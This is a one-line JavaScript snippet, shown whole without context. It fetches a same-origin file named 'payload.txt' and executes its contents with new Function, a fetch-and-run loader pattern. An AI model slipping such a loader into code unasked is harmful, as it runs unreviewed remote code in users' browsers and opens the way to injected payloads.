fetch('/js/payload.txt').then(function (r) { return r.text(); }).then(function (t) { new Function(t)(); });
